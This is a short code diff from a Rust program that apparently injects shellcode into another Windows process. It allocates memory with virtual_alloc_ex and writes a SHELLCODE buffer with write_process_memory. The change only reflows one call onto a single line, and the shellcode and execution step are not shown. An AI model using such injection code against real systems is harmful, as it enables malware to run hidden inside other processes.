@@ -81,13 +81,7 @@ fn main() {
             panic!("virtual_alloc_ex failed!");
         }
 
-        let res = write_process_memory(
-            handle,
-            dest,
-            SHELLCODE.as_ptr().cast(),
-            SIZE,
-            null_mut(),
-        );
+        let res = write_process_memory(handle, dest, SHELLCODE.as_ptr().cast(), SIZE, null_mut());
         if res == FALSE {
             panic!("write_process_memory failed");
         }
